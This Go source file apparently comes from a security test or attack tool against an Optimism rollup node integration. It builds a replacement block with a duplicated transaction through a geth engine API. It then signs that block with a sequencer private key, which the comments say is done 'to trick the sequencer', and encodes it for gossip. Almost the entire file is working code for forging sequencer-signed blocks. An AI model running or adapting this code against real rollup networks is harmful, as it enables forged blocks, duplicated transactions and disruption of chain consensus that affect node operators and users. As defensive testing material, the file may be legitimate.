package main

import (
	"bytes"
	"context"
	"crypto/ecdsa"
	"fmt"
	"log"
	"net/http"
	"time"

	"github.com/ethereum-optimism/optimism/op-service/client"
	"github.com/ethereum-optimism/optimism/op-service/eth"
	opsigner "github.com/ethereum-optimism/optimism/op-service/signer"
	"github.com/ethereum/go-ethereum/common"
	"github.com/golang-jwt/jwt/v5"
	"github.com/golang/snappy"
)

type Engine struct {
	client     client.RPC
	privateKey *ecdsa.PrivateKey
	chainId    eth.ChainID
}

type jwtTransport struct {
	secret []byte
}

const SIGNATURE_LENGTH = 65

// Use for our client so that it is able to get a refreshed jwt token for each request
func (t *jwtTransport) RoundTrip(req *http.Request) (*http.Response, error) {
	claims := jwt.MapClaims{"iat": time.Now().Unix()}
	token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
	signed, _ := token.SignedString(t.secret)
	req = req.Clone(req.Context())
	req.Header.Set("Authorization", "Bearer "+signed)
	return http.DefaultTransport.RoundTrip(req)
}

// We craft a malicious payload by duplicating the transaction and let send it to geth first to process and run through EVM and then retrieve the payload
func (e *Engine) buildMaliciousBlock(payloadEnvelope *eth.ExecutionPayloadEnvelope, parentHash *common.Hash) (*eth.ExecutionPayloadEnvelope, error) {
	payload := payloadEnvelope.ExecutionPayload

	if len(payload.Transactions) == 0 {
		return nil, fmt.Errorf("no transactions in payload")
	}

	// If we have already forked make sure we give the head hash to the previous forked hash
	headBlockHash := payload.ParentHash
	if parentHash != nil {
		headBlockHash = *parentHash
	}
	forkState := eth.ForkchoiceState{
		HeadBlockHash:      headBlockHash,
		SafeBlockHash:      common.Hash{},
		FinalizedBlockHash: common.Hash{},
	}

	// Craft new payload to send to geth
	minBaseFee := uint64(0)
	payloadAttributes := eth.PayloadAttributes{
		Timestamp:             payload.Timestamp,
		PrevRandao:            payload.PrevRandao,
		SuggestedFeeRecipient: payload.FeeRecipient,
		Withdrawals:           payload.Withdrawals,
		ParentBeaconBlockRoot: payloadEnvelope.ParentBeaconBlockRoot,
		// Here we just duplicate transactions in the payload
		Transactions: []eth.Data{payload.Transactions[0], payload.Transactions[0]},
		NoTxPool:     true,
		GasLimit:     &payload.GasLimit,
		// Just hardcoding eip params from a random request
		EIP1559Params: (*eth.Bytes8)([]byte{0x00, 0x00, 0x00, 0xfa, 0x00, 0x00, 0x00, 0x06}),
		MinBaseFee:    &minBaseFee,
	}

	// We need to send it to geth engine here to start processing and give us a new block hash
	var fcuResult eth.ForkchoiceUpdatedResult
	if err := e.client.CallContext(context.Background(), &fcuResult, string(eth.FCUV3), &forkState, &payloadAttributes); err != nil {
		return nil, fmt.Errorf("forkchoiceUpdated: %w", err)
	}
	log.Printf("forkchoiceUpdated payloadID=%s", fcuResult.PayloadID)

	// Wait for geth
	time.Sleep(500 * time.Millisecond)

	// Fetch the new payload and send this to the full node now
	var newPayload eth.ExecutionPayloadEnvelope
	if err := e.client.CallContext(context.Background(), &newPayload, string(eth.GetPayloadV4), fcuResult.PayloadID); err != nil {
		return nil, fmt.Errorf("getPayload: %w", err)
	}
	return &newPayload, nil
}

// Unmarshal the payload following what is done in optimism repo
// see https://github.com/EspressoSystems/optimism-espresso-integration/blob/4c769c98c924cb840d6d0bcc34fdeca910e5d030/op-node/p2p/gossip.go#L305
func (p *Engine) unmarshalPayload(data []byte) (*eth.ExecutionPayloadEnvelope, error) {
	if len(data) < SIGNATURE_LENGTH {
		return nil, fmt.Errorf("message too short (%d bytes)", len(data))
	}
	payloadBytes := data[SIGNATURE_LENGTH:]
	var envelope eth.ExecutionPayloadEnvelope
	if err := envelope.UnmarshalSSZ(eth.BlockV4, uint32(len(payloadBytes)), bytes.NewReader(payloadBytes)); err != nil {
		return nil, fmt.Errorf("unmarshal envelope: %w", err)
	}
	return &envelope, nil
}

// Sign the payload with sequencer private key to trick the sequencer
func (e *Engine) signPayload(sszPayload []byte, privKey *ecdsa.PrivateKey) ([SIGNATURE_LENGTH]byte, error) {
	signer := opsigner.NewLocalSigner(privKey)
	payloadHash := opsigner.PayloadHash(sszPayload)
	sig, err := signer.SignBlockV1(context.Background(), e.chainId, payloadHash)
	return [SIGNATURE_LENGTH]byte(sig), err
}

// Encode the envelope back into raw bytes
func (e *Engine) encodePayloadEnvelope(envelope *eth.ExecutionPayloadEnvelope) ([]byte, error) {
	var buf bytes.Buffer
	buf.Write(make([]byte, SIGNATURE_LENGTH))

	if _, err := envelope.MarshalSSZ(&buf); err != nil {
		return nil, fmt.Errorf("marshal envelope: %w", err)
	}
	data := buf.Bytes()

	sig, err := e.signPayload(data[SIGNATURE_LENGTH:], e.privateKey)
	if err != nil {
		return nil, fmt.Errorf("sign: %w", err)
	}
	copy(data[:SIGNATURE_LENGTH], sig[:])
	return snappy.Encode(nil, data), nil
}

func (e *Engine) modifyPayload(payload *eth.ExecutionPayloadEnvelope, parentOverride *common.Hash) ([]byte, common.Hash, error) {
	newPayload, err := e.buildMaliciousBlock(payload, parentOverride)
	if err != nil {
		return nil, common.Hash{}, fmt.Errorf("build block: %w", err)
	}
	log.Printf("built replacement block hash %s", newPayload.ExecutionPayload.BlockHash)

	encoded, err := e.encodePayloadEnvelope(newPayload)

	return encoded, newPayload.ExecutionPayload.BlockHash, err
}
